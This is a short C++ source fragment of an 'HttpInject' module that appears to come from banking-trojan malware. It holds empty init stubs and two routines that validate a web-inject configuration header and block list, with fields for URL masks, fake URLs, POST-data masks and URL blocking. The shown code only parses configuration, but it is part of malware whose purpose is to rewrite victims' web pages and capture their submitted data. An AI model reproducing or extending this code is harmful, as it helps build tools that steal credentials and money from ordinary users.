#include <windows.h>

#include "httpinject.h"

void HttpInject::init(void)
{

}

void HttpInject::uninit(void)
{


}

bool HttpInject::_isCorrectHeader(const HEADER *header)
{
  if(
     header->size              >= sizeof(HEADER) &&
     header->urlMask            < header->size &&
     header->fakeUrl            < header->size &&
     header->postDataBlackMask  < header->size &&
     header->postDataWhiteMask  < header->size &&
     header->blockOnUrl         < header->size &&
     header->contextMask        < header->size
    )return true;
  return false;
}

bool HttpInject::_isCorrectBlockList(const INJECTBLOCK *block, DWORD size)
{
  DWORD count           = 0;
  INJECTBLOCK *curBlock = (INJECTBLOCK *)block;
  LPBYTE end            = (LPBYTE)curBlock + size;

  while(((LPBYTE)curBlock) + sizeof(INJECTBLOCK) <= end && curBlock->size >= sizeof(INJECTBLOCK) && ((LPBYTE)(curBlock = (INJECTBLOCK *)(((LPBYTE)curBlock) + curBlock->size))) <= end)count++;

  return (count > 0 && count % 3 == 0 && (LPBYTE)curBlock == end);
}
